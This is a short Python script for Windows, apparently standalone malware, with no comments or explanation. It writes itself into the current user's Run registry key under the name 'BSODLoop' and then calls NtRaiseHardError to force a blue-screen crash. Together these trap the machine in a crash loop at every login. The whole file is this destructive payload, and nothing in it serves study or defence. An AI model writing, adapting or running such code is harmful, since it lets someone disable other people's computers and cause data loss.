import os
import sys
import ctypes
import winreg
def run():
    def trigger_bsod():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B),
            0,
            None,
            None,
            6,
            ctypes.byref(ctypes.c_uint())
        )

    def add_to_startup():
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        script_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, "BSODLoop", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        winreg.CloseKey(key)

    if __name__ == "__main__":
        if os.name != "nt":
            sys.exit(0)
        add_to_startup()
        trigger_bsod()
